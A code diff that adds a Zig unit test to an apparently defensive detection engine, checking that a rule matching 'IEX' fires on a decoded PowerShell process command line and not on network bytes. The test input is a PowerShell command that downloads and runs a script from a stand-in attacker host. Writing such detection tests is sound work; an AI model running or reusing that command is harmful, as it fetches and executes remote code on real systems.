@@ -749,3 +749,30 @@ test "RULE-LAYER-SCOPE: kernel patterns do not fire on network bytes" {
     try std.testing.expect(hit != null);
     try std.testing.expectEqual(hashRuleId("R9059"), hit.?.rule_id);
 }
+
+test "RULE-COVERAGE-001: R2003 evaluates a decoded process command line" {
+    // The ETW TLV decode test in etw_realtime.zig proves `CommandLine` reaches
+    // EtwEventRecord.commandLine() when a provider supplies it. This half
+    // proves the kernel_process automaton evaluates those exact bytes.
+    const alloc = std.testing.allocator;
+    var kernel_process = try sig.AhoCorasick.init(alloc, 10_000);
+    defer kernel_process.deinit();
+    var network = try sig.AhoCorasick.init(alloc, 10_000);
+    defer network.deinit();
+    try kernel_process.addPattern(hashRuleId("R2003"), "IEX");
+    try network.addPattern(hashRuleId("R9059"), "<script>");
+    try kernel_process.build();
+    try network.build();
+
+    const cmdline = "powershell -c IEX (New-Object Net.WebClient).DownloadString('https://evil.example/p.ps1')";
+    const hit = kernel_process.matchFirst(cmdline) orelse return error.TestUnexpectedResult;
+    try std.testing.expectEqual(hashRuleId("R2003"), hit.rule_id);
+
+    // FP-1 negative control: the same text on a wire source carries no
+    // KERNEL_PROCESS rule id because the network automaton never holds R2003.
+    try std.testing.expect(network.matchFirst(cmdline) == null);
+
+    // FN-1 negative control: an ImageName-only ProcessStart (this host's
+    // v0..v4 reality) has no text for R2003 to match. No fake positive.
+    try std.testing.expect(kernel_process.matchFirst("powershell.exe") == null);
+}
